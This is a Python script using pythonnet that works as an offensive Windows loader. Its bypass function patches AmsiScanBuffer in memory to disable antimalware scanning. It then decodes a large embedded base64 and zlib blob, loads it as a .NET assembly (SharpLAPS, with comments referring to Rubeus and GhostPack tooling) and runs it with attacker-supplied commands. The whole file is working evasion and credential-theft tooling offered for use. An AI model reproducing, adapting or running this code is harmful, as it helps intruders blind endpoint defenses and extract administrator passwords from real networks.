import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpLAPS.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()